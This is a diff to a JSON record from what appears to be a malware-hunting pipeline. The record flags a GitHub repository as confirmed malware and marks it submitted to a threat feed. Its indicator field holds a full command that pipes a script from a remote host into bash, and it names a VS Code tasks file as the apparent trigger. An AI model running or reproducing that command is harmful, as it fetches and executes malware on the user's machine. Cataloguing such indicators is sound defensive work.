@@ -2,6 +2,7 @@
   "finding": {
     "key": "repository:dawit212119/go",
     "kind": "repository",
+    "family": "",
     "id": "dawit212119/go",
     "url": "https://github.com/Dawit212119/Go",
     "registry": "github",
@@ -18,8 +19,8 @@
     "iocs": "default-configuration-sandy.vercel.app; https://default-configuration-sandy.vercel.app/settings/linux?flag=9-test; curl https://default-configuration-sandy.vercel.app/settings/linux?flag=9-test | bash; ch2/.vscode/tasks.json",
     "matched_signatures": "settings/linux?flag=; settings/win?flag=",
     "reasons": "Shares a confirmed-malware code signature ['settings/linux?flag=', 'settings/win?flag='] | Tier-2 confirmed (bash score 5)",
-    "osm_status": "not_submitted",
-    "osm_threat_id": "",
+    "osm_status": "submitted",
+    "osm_threat_id": "5f2deb85-3bf1-43c3-ae74-5f410687036d",
     "first_seen": "hunt-20260928T024937Z",
     "last_seen": "hunt-20260928T024937Z",
     "evidence_file": "repositories/dawit212119_go.json",
